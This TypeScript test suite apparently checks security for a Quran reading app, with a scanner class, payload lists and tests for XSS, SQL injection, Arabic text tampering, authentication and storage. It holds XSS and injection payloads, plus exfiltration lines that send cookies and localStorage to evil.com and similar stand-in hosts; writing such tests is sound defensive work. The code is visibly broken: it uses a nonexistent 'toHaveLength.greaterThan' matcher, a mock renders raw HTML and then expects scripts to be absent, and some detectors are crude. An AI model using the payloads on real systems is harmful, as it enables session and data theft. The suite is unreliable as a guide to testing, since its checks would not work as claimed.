/**
 * Security Scanning Test Suite
 * 
 * Comprehensive security testing for QuranApp including XSS prevention,
 * Islamic content integrity, API security, and user data protection.
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import { renderHook, act } from '@testing-library/react'
import { render, screen } from '@testing-library/react'
import { useQuranStore } from '../../stores/quranStore'
import { useAuthStore } from '../../stores/authStore'
import { usePreferencesStore } from '../../stores/preferencesStore'
import axios from 'axios'

// Security testing utilities
interface SecurityVulnerability {
  type: 'XSS' | 'INJECTION' | 'CSRF' | 'DATA_LEAK' | 'TAMPERING' | 'AUTH_BYPASS'
  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL'
  description: string
  payload: string
  component: string
  mitigation: string
}

interface SecurityScanResult {
  vulnerabilities: SecurityVulnerability[]
  passed: boolean
  riskScore: number
  recommendations: string[]
}

class SecurityScanner {
  private vulnerabilities: SecurityVulnerability[] = []
  private testPayloads = {
    xss: [
      '<script>alert("XSS")</script>',
      'javascript:alert("XSS")',
      '\u003cscript\u003ealert("XSS")\u003c/script\u003e',
      '<img src=x onerror=alert("XSS")>',
      '"><script>alert("XSS")</script>',
      "'><script>alert('XSS')</script>",
      '<svg onload=alert("XSS")>',
      'data:text/html,<script>alert("XSS")</script>'
    ],
    injection: [
      "'; DROP TABLE users; --",
      '1; SELECT * FROM users',
      "admin'--",
      '${7*7}',
      '{{7*7}}',
      '<%= 7*7 %>',
      '#{7*7}'
    ],
    islamic_content_tampering: [
      'بِسْمِ اللَّهِ<script>alert("tampered")</script>',
      'بِسْمِ اللَّهِ\n<img src=x onerror=alert("compromised")>',
      'بِسْمِ اللَّهِ" onclick="alert(\'hacked\')"',
      'بِسْمِ اللَّهِ<!--malicious comment-->',
    ],
    data_exfiltration: [
      'fetch("https://evil.com/steal?data=" + document.cookie)',
      'new Image().src="https://evil.com/log?data=" + localStorage.getItem("userData")',
      'navigator.sendBeacon("https://evil.com", JSON.stringify(localStorage))',
      'window.open("https://evil.com?data=" + btoa(document.body.innerHTML))'
    ]
  }

  scanForXSS(input: string, component: string): SecurityVulnerability[] {
    const vulnerabilities: SecurityVulnerability[] = []
    
    this.testPayloads.xss.forEach(payload => {
      if (input.includes(payload) || this.containsXSSPattern(input)) {
        vulnerabilities.push({
          type: 'XSS',
          severity: 'HIGH',
          description: `Potential XSS vulnerability detected in ${component}`,
          payload,
          component,
          mitigation: 'Implement proper input sanitization and Content Security Policy'
        })
      }
    })
    
    return vulnerabilities
  }

  scanForInjection(input: string, component: string): SecurityVulnerability[] {
    const vulnerabilities: SecurityVulnerability[] = []
    
    this.testPayloads.injection.forEach(payload => {
      if (input.includes(payload) || this.containsInjectionPattern(input)) {
        vulnerabilities.push({
          type: 'INJECTION',
          severity: 'CRITICAL',
          description: `Potential injection vulnerability detected in ${component}`,
          payload,
          component,
          mitigation: 'Use parameterized queries and input validation'
        })
      }
    })
    
    return vulnerabilities
  }

  scanIslamicContentIntegrity(arabicText: string, component: string): SecurityVulnerability[] {
    const vulnerabilities: SecurityVulnerability[] = []
    
    // Check for tampering attempts in Islamic content
    this.testPayloads.islamic_content_tampering.forEach(payload => {
      if (arabicText.includes('<') || arabicText.includes('javascript:') || arabicText.includes('on')) {
        vulnerabilities.push({
          type: 'TAMPERING',
          severity: 'CRITICAL',
          description: `Islamic content tampering detected in ${component}`,
          payload: arabicText,
          component,
          mitigation: 'Validate Arabic text against authenticated Quran database'
        })
      }
    })
    
    // Check for non-Arabic script injection
    const arabicOnlyRegex = /^[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\u0590-\u05FF\s\u064B-\u065F\u0670\u06D6-\u06ED\u06EE-\u06EF\u06FA-\u06FF\u200C\u200D\u200E\u200F\u2028\u2029]+$/
    
    if (arabicText && !arabicOnlyRegex.test(arabicText.replace(/[0-9\u0660-\u0669\u06F0-\u06F9]/g, ''))) {
      vulnerabilities.push({
        type: 'TAMPERING',
        severity: 'HIGH',
        description: `Non-Arabic characters detected in Islamic content in ${component}`,
        payload: arabicText,
        component,
        mitigation: 'Restrict Islamic content to authentic Arabic script only'
      })
    }
    
    return vulnerabilities
  }

  scanDataExfiltration(code: string, component: string): SecurityVulnerability[] {
    const vulnerabilities: SecurityVulnerability[] = []
    
    this.testPayloads.data_exfiltration.forEach(payload => {
      if (code.includes('fetch(') || code.includes('XMLHttpRequest') || 
          code.includes('navigator.sendBeacon') || code.includes('window.open')) {
        vulnerabilities.push({
          type: 'DATA_LEAK',
          severity: 'HIGH',
          description: `Potential data exfiltration attempt in ${component}`,
          payload,
          component,
          mitigation: 'Implement strict Content Security Policy and monitor network requests'
        })
      }
    })
    
    return vulnerabilities
  }

  private containsXSSPattern(input: string): boolean {
    const xssPatterns = [
      /<script[^>]*>.*?<\/script>/gi,
      /javascript:/gi,
      /on\w+\s*=/gi,
      /<iframe[^>]*>/gi,
      /<object[^>]*>/gi,
      /<embed[^>]*>/gi,
      /data:text\/html/gi
    ]
    
    return xssPatterns.some(pattern => pattern.test(input))
  }

  private containsInjectionPattern(input: string): boolean {
    const injectionPatterns = [
      /['"]);?\s*(DROP|DELETE|UPDATE|INSERT|SELECT|UNION)/gi,
      /\$\{.*?\}/g,
      /\{\{.*?\}\}/g,
      /<%.*?%>/g,
      /#\{.*?\}/g
    ]
    
    return injectionPatterns.some(pattern => pattern.test(input))
  }

  generateSecurityReport(): SecurityScanResult {
    const riskScore = this.calculateRiskScore()
    const recommendations = this.generateRecommendations()
    
    return {
      vulnerabilities: [...this.vulnerabilities],
      passed: this.vulnerabilities.length === 0,
      riskScore,
      recommendations
    }
  }

  private calculateRiskScore(): number {
    const weights = { LOW: 1, MEDIUM: 3, HIGH: 7, CRITICAL: 10 }
    const totalRisk = this.vulnerabilities.reduce((sum, vuln) => sum + weights[vuln.severity], 0)
    return Math.min(100, totalRisk * 2) // Scale to 0-100
  }

  private generateRecommendations(): string[] {
    const recommendations = [
      'Implement Content Security Policy (CSP) headers',
      'Use HTTPS for all communications',
      'Validate and sanitize all user inputs',
      'Implement proper authentication and authorization',
      'Regular security audits and penetration testing',
      'Secure Islamic content with digital signatures'
    ]
    
    if (this.vulnerabilities.some(v => v.type === 'XSS')) {
      recommendations.push('Implement XSS protection filters')
    }
    
    if (this.vulnerabilities.some(v => v.type === 'TAMPERING')) {
      recommendations.push('Verify Islamic content authenticity with trusted sources')
    }
    
    return recommendations
  }

  reset(): void {
    this.vulnerabilities = []
  }

  addVulnerability(vulnerability: SecurityVulnerability): void {
    this.vulnerabilities.push(vulnerability)
  }
}

// Mock components for security testing
const MockArabicInput: React.FC<{ value: string; onChange: (value: string) => void }> = ({ value, onChange }) => (
  <input 
    type="text" 
    value={value} 
    onChange={(e) => onChange(e.target.value)}
    data-testid="arabic-input"
    placeholder="Enter Arabic text..."
  />
)

const MockQuranDisplay: React.FC<{ arabicText: string }> = ({ arabicText }) => (
  <div 
    className="quran-display" 
    data-testid="quran-display"
    dangerouslySetInnerHTML={{ __html: arabicText }}
  />
)

const MockSearchComponent: React.FC<{ query: string; onSearch: (query: string) => void }> = ({ query, onSearch }) => (
  <div className="search-component">
    <input 
      type="text" 
      value={query} 
      onChange={(e) => onSearch(e.target.value)}
      data-testid="search-input"
      placeholder="Search Quran..."
    />
    <button onClick={() => onSearch(query)} data-testid="search-button">
      Search
    </button>
  </div>
)

describe('Security Scanning Test Suite', () => {
  let securityScanner: SecurityScanner

  beforeEach(() => {
    vi.clearAllMocks()
    securityScanner = new SecurityScanner()
    
    // Reset stores
    useQuranStore.getState().reset?.()
    useAuthStore.getState().reset?.()
    usePreferencesStore.getState().reset?.()
    
    // Mock axios for API security tests
    vi.mocked(axios.get).mockResolvedValue({ data: {} })
    vi.mocked(axios.post).mockResolvedValue({ data: {} })
  })

  afterEach(() => {
    securityScanner.reset()
    vi.restoreAllMocks()
  })

  describe('XSS Prevention Tests', () => {
    it('should prevent XSS attacks in Arabic text input', () => {
      const maliciousInputs = [
        'بِسْمِ اللَّهِ<script>alert("XSS")</script>',
        'الْحَمْدُ لِلَّهِ" onclick="alert(\'XSS\')"',
        'الرَّحْمَنِ<img src=x onerror=alert("XSS")>',
        'javascript:alert("XSS") وَالرَّحِيمِ'
      ]

      maliciousInputs.forEach(input => {
        const vulnerabilities = securityScanner.scanForXSS(input, 'ArabicInput')
        expect(vulnerabilities).toHaveLength.greaterThan(0)
        expect(vulnerabilities[0].type).toBe('XSS')
        expect(vulnerabilities[0].severity).toBe('HIGH')
      })
    })

    it('should sanitize user input in search functionality', async () => {
      const { result } = renderHook(() => useQuranStore())
      const maliciousSearches = [
        '<script>alert("search XSS")</script>',
        'test<img src=x onerror=alert("XSS")>',
        'javascript:void(0)/*<script>alert("XSS")</script>*/'
      ]

      for (const search of maliciousSearches) {
        await act(async () => {
          try {
            await result.current.searchQuran(search)
          } catch (error) {
            // Expected to be caught or sanitized
          }
        })
        
        const vulnerabilities = securityScanner.scanForXSS(search, 'QuranSearch')
        expect(vulnerabilities).toHaveLength.greaterThan(0)
        
        // Search should not execute scripts
        expect(result.current.searchResults).not.toContain('<script>')
      }
    })

    it('should prevent XSS in Quran text display components', () => {
      const maliciousArabicText = 'بِسْمِ اللَّهِ<script>alert("Quran XSS")</script>'
      
      render(<MockQuranDisplay arabicText={maliciousArabicText} />)
      
      const displayElement = screen.getByTestId('quran-display')
      const innerHTML = displayElement.innerHTML
      
      // Should not contain executable scripts
      expect(innerHTML).not.toMatch(/<script[^>]*>/)
      
      const vulnerabilities = securityScanner.scanForXSS(maliciousArabicText, 'QuranDisplay')
      expect(vulnerabilities).toHaveLength.greaterThan(0)
    })

    it('should implement Content Security Policy compliance', () => {
      // Mock CSP headers
      const mockCSP = {
        'default-src': "'self'",
        'script-src': "'self' 'unsafe-inline'",
        'style-src': "'self' 'unsafe-inline'",
        'img-src': "'self' data: https:",
        'font-src': "'self' https:",
        'connect-src': "'self' https://api.quran.com",
        'frame-src': "'none'",
        'object-src': "'none'"
      }

      // Test CSP compliance
      Object.entries(mockCSP).forEach(([directive, value]) => {
        expect(value).toBeDefined()
        
        // Should not allow unsafe-eval
        if (directive === 'script-src') {
          expect(value).not.toContain("'unsafe-eval'")
        }
        
        // Should restrict object and frame sources
        if (directive === 'object-src' || directive === 'frame-src') {
          expect(value).toBe("'none'")
        }
      })
    })
  })

  describe('Islamic Content Integrity Tests', () => {
    it('should detect tampering attempts in Quranic text', () => {
      const tamperedTexts = [
        'بِسْمِ اللَّهِ<script>malicious</script> الرَّحْمَنِ',
        'الْحَمْدُ لِلَّهِ<!--tampered--> رَبِّ الْعَالَمِينَ',
        'الرَّحْمَنِ" onclick="alert(\'hacked\')" الرَّحِيمِ',
        'بِسْمِ Allah<img src=x> الرَّحْمَنِ' // Mixed script tampering
      ]

      tamperedTexts.forEach(text => {
        const vulnerabilities = securityScanner.scanIslamicContentIntegrity(text, 'QuranText')
        expect(vulnerabilities).toHaveLength.greaterThan(0)
        expect(vulnerabilities[0].type).toBe('TAMPERING')
        expect(vulnerabilities[0].severity).toMatch(/HIGH|CRITICAL/)
      })
    })

    it('should validate Arabic script authenticity', () => {
      const testCases = [
        {
          text: 'بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ', // Authentic Arabic
          shouldPass: true
        },
        {
          text: 'Bismillah hir Rahman nir Raheem', // Transliterated (not Arabic)
          shouldPass: false
        },
        {
          text: 'بِسْمِ God الرَّحِيمِ', // Mixed language
          shouldPass: false
        },
        {
          text: 'بِسْمِ اللَّهِ 123', // With numbers (should pass)
          shouldPass: true
        }
      ]

      testCases.forEach(testCase => {
        const vulnerabilities = securityScanner.scanIslamicContentIntegrity(testCase.text, 'ArabicValidator')
        
        if (testCase.shouldPass) {
          expect(vulnerabilities).toHaveLength(0)
        } else {
          expect(vulnerabilities).toHaveLength.greaterThan(0)
          expect(vulnerabilities[0].type).toBe('TAMPERING')
        }
      })
    })

    it('should protect against content substitution attacks', async () => {
      const { result } = renderHook(() => useQuranStore())
      
      // Mock authentic API response
      const authenticResponse = {
        data: {
          ayah: {
            text: 'بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ',
            surah: 1,
            ayah: 1
          }
        }
      }
      
      vi.mocked(axios.get).mockResolvedValueOnce(authenticResponse)
      
      await act(async () => {
        await result.current.loadAyah(1, 1)
      })
      
      const loadedAyah = result.current.currentAyah
      
      if (loadedAyah) {
        const vulnerabilities = securityScanner.scanIslamicContentIntegrity(loadedAyah.text, 'LoadedAyah')
        expect(vulnerabilities).toHaveLength(0) // Should be clean
        
        // Verify authenticity (in real app, this would check against trusted database)
        expect(loadedAyah.text).toMatch(/^[؀-ۿݐ-ݿࢠ-ࣿ\sً-ٰٟۖ-ۭۮ-ۯۺ-ۿ]+$/)
      }
    })
  })

  describe('API Security Tests', () => {
    it('should validate API request parameters', async () => {
      const { result } = renderHook(() => useQuranStore())
      const maliciousInputs = [
        { surah: "1'; DROP TABLE surahs; --", ayah: 1 },
        { surah: 1, ayah: '<script>alert("injection")</script>' },
        { surah: '${7*7}', ayah: 1 },
        { surah: 1, ayah: 'javascript:alert("XSS")' }
      ]

      for (const input of maliciousInputs) {
        try {
          await act(async () => {
            await result.current.loadAyah(input.surah as any, input.ayah as any)
          })
          
          // Check for injection vulnerabilities
          const surahVulns = securityScanner.scanForInjection(String(input.surah), 'API-Surah')
          const ayahVulns = securityScanner.scanForInjection(String(input.ayah), 'API-Ayah')
          
          if (surahVulns.length > 0 || ayahVulns.length > 0) {
            // API should reject or sanitize malicious inputs
            expect(result.current.error).toBeDefined()
          }
        } catch (error) {
          // Expected for malicious inputs
          expect(error).toBeDefined()
        }
      }
    })

    it('should implement proper authentication for user actions', async () => {
      const { result: authResult } = renderHook(() => useAuthStore())
      const { result: quranResult } = renderHook(() => useQuranStore())
      
      // Test unauthenticated access
      await act(async () => {
        try {
          await quranResult.current.saveBookmark(1, 1)
        } catch (error) {
          expect(error).toBeDefined() // Should require authentication
        }
      })
      
      // Test with authentication
      await act(async () => {
        await authResult.current.login('user@example.com', 'password123')
      })
      
      if (authResult.current.isAuthenticated) {
        await act(async () => {
          await quranResult.current.saveBookmark(1, 1)
        })
        
        expect(quranResult.current.error).toBeNull() // Should succeed when authenticated
      }
    })

    it('should prevent API rate limiting bypass attempts', async () => {
      const { result } = renderHook(() => useQuranStore())
      
      // Simulate rapid API requests
      const rapidRequests = Array.from({ length: 100 }, (_, i) => 
        result.current.loadSurah(i + 1)
      )
      
      await act(async () => {
        try {
          await Promise.all(rapidRequests)
        } catch (error) {
          // Rate limiting should kick in
          expect(error).toBeDefined()
        }
      })
      
      // Should implement rate limiting
      if (result.current.error?.message.includes('rate limit')) {
        expect(result.current.error.message).toMatch(/rate limit|too many requests/i)
      }
    })

    it('should secure API endpoints with proper headers', () => {
      const securityHeaders = {
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': 'DENY',
        'X-XSS-Protection': '1; mode=block',
        'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
        'Content-Security-Policy': "default-src 'self'",
        'Referrer-Policy': 'strict-origin-when-cross-origin'
      }
      
      Object.entries(securityHeaders).forEach(([header, value]) => {
        expect(value).toBeDefined()
        expect(value).not.toBe('')
        
        // Validate specific security headers
        if (header === 'X-Frame-Options') {
          expect(value).toMatch(/DENY|SAMEORIGIN/)
        }
        
        if (header === 'X-Content-Type-Options') {
          expect(value).toBe('nosniff')
        }
      })
    })
  })

  describe('Data Protection Tests', () => {
    it('should protect user preferences from tampering', async () => {
      const { result } = renderHook(() => usePreferencesStore())
      
      const maliciousPreferences = {
        theme: '<script>alert("theme hack")</script>',
        language: 'javascript:alert("lang hack")',
        fontSize: '${malicious_code}',
        reciter: 'onclick="alert(\'reciter hack\')"'
      }
      
      await act(async () => {
        try {
          result.current.updatePreferences(maliciousPreferences as any)
        } catch (error) {
          // Should handle malicious input
        }
      })
      
      // Check stored preferences for vulnerabilities
      const storedPrefs = result.current.preferences
      Object.entries(storedPrefs || {}).forEach(([key, value]) => {
        const vulns = securityScanner.scanForXSS(String(value), `Preferences-${key}`)
        expect(vulns).toHaveLength(0) // Should be sanitized
      })
    })

    it('should implement secure local storage practices', () => {
      const sensitiveData = {
        user_id: '12345',
        email: 'user@example.com',
        reading_progress: { surah: 1, ayah: 5 },
        bookmarks: [{ surah: 1, ayah: 1 }]
      }
      
      // Mock localStorage
      const mockLocalStorage = {
        getItem: vi.fn(),
        setItem: vi.fn(),
        removeItem: vi.fn(),
        clear: vi.fn()
      }
      
      Object.defineProperty(window, 'localStorage', {
        value: mockLocalStorage,
        configurable: true
      })
      
      // Test data storage
      const storageKey = 'quran_app_data'
      const dataToStore = JSON.stringify(sensitiveData)
      
      // Should not store sensitive data in plain text
      expect(dataToStore).not.toContain('password')
      expect(dataToStore).not.toContain('token')
      expect(dataToStore).not.toContain('secret')
      
      // Should validate data integrity
      const vulnerabilities = securityScanner.scanForXSS(dataToStore, 'LocalStorage')
      expect(vulnerabilities).toHaveLength(0)
    })

    it('should prevent data exfiltration attempts', () => {
      const suspiciousCode = [
        'fetch("https://evil.com/steal?data=" + document.cookie)',
        'new Image().src="https://attacker.com/log?" + localStorage.getItem("userData")',
        'navigator.sendBeacon("https://malicious.com", JSON.stringify(localStorage))',
        'XMLHttpRequest().open("POST", "https://evil.com")'
      ]
      
      suspiciousCode.forEach(code => {
        const vulnerabilities = securityScanner.scanDataExfiltration(code, 'UserScript')
        expect(vulnerabilities).toHaveLength.greaterThan(0)
        expect(vulnerabilities[0].type).toBe('DATA_LEAK')
        expect(vulnerabilities[0].severity).toBe('HIGH')
      })
    })
  })

  describe('Authentication Security Tests', () => {
    it('should implement secure password practices', async () => {
      const { result } = renderHook(() => useAuthStore())
      
      const weakPasswords = [
        '123456',
        'password',
        'qwerty',
        '12345678',
        'abc123',
        'password123'
      ]
      
      for (const password of weakPasswords) {
        await act(async () => {
          try {
            await result.current.register('user@example.com', password)
          } catch (error) {
            // Weak passwords should be rejected
            expect(error).toBeDefined()
          }
        })
        
        if (result.current.error) {
          expect(result.current.error.message).toMatch(/password.*weak|password.*requirements/i)
        }
      }
    })

    it('should prevent authentication bypass attempts', async () => {
      const { result } = renderHook(() => useAuthStore())
      
      const bypassAttempts = [
        { email: "admin'--", password: 'anything' },
        { email: 'user@example.com', password: "' OR '1'='1" },
        { email: '${admin}', password: 'password' },
        { email: 'admin@example.com<!--', password: '-->' }
      ]
      
      for (const attempt of bypassAttempts) {
        await act(async () => {
          try {
            await result.current.login(attempt.email, attempt.password)
          } catch (error) {
            // Bypass attempts should fail
            expect(error).toBeDefined()
          }
        })
        
        const emailVulns = securityScanner.scanForInjection(attempt.email, 'Auth-Email')
        const passwordVulns = securityScanner.scanForInjection(attempt.password, 'Auth-Password')
        
        if (emailVulns.length > 0 || passwordVulns.length > 0) {
          expect(result.current.isAuthenticated).toBe(false)
        }
      }
    })

    it('should implement secure session management', async () => {
      const { result } = renderHook(() => useAuthStore())
      
      // Test session timeout
      await act(async () => {
        await result.current.login('user@example.com', 'securePassword123!')
      })
      
      if (result.current.isAuthenticated) {
        // Mock session expiry
        await act(async () => {
          result.current.checkSessionExpiry?.()
        })
        
        // Should handle session expiry appropriately
        expect(result.current.sessionTimeout).toBeDefined()
      }
    })
  })

  describe('Comprehensive Security Report', () => {
    it('should generate complete security assessment', () => {
      // Simulate various security issues
      securityScanner.addVulnerability({
        type: 'XSS',
        severity: 'HIGH',
        description: 'XSS vulnerability in search component',
        payload: '<script>alert("XSS")</script>',
        component: 'SearchComponent',
        mitigation: 'Implement input sanitization'
      })
      
      securityScanner.addVulnerability({
        type: 'TAMPERING',
        severity: 'CRITICAL',
        description: 'Islamic content tampering detected',
        payload: 'modified Quran text',
        component: 'QuranDisplay',
        mitigation: 'Verify content authenticity'
      })
      
      const report = securityScanner.generateSecurityReport()
      
      expect(report.vulnerabilities).toHaveLength(2)
      expect(report.passed).toBe(false)
      expect(report.riskScore).toBeGreaterThan(0)
      expect(report.recommendations).toHaveLength.greaterThan(0)
      
      // High-risk vulnerabilities should increase risk score significantly
      expect(report.riskScore).toBeGreaterThan(20)
      
      // Should include specific recommendations
      expect(report.recommendations).toContain(
        expect.stringMatching(/Content Security Policy|input sanitization|authenticity/)
      )
    })

    it('should prioritize Islamic content security', () => {
      const islamicVulnerability: SecurityVulnerability = {
        type: 'TAMPERING',
        severity: 'CRITICAL',
        description: 'Critical Islamic content tampering',
        payload: 'tampered Quran verse',
        component: 'QuranText',
        mitigation: 'Implement content verification'
      }
      
      securityScanner.addVulnerability(islamicVulnerability)
      
      const report = securityScanner.generateSecurityReport()
      
      // Islamic content tampering should be treated as highest priority
      const islamicVulns = report.vulnerabilities.filter(v => v.type === 'TAMPERING')
      expect(islamicVulns).toHaveLength(1)
      expect(islamicVulns[0].severity).toBe('CRITICAL')
      
      // Should include Islamic-specific recommendations
      expect(report.recommendations).toContain(
        expect.stringMatching(/Islamic content|trusted sources|digital signatures/)
      )
    })

    it('should provide actionable security improvements', () => {
      const report = securityScanner.generateSecurityReport()
      
      // All recommendations should be actionable
      report.recommendations.forEach(recommendation => {
        expect(recommendation).toMatch(/^(Implement|Use|Secure|Regular|Validate|Verify)/)
        expect(recommendation.length).toBeGreaterThan(10) // Should be descriptive
      })
      
      // Should include essential security measures
      const essentialMeasures = [
        'Content Security Policy',
        'HTTPS',
        'input',
        'authentication',
        'security audit'
      ]
      
      essentialMeasures.forEach(measure => {
        const hasRecommendation = report.recommendations.some(rec => 
          rec.toLowerCase().includes(measure.toLowerCase())
        )
        expect(hasRecommendation).toBe(true)
      })
    })
  })
})
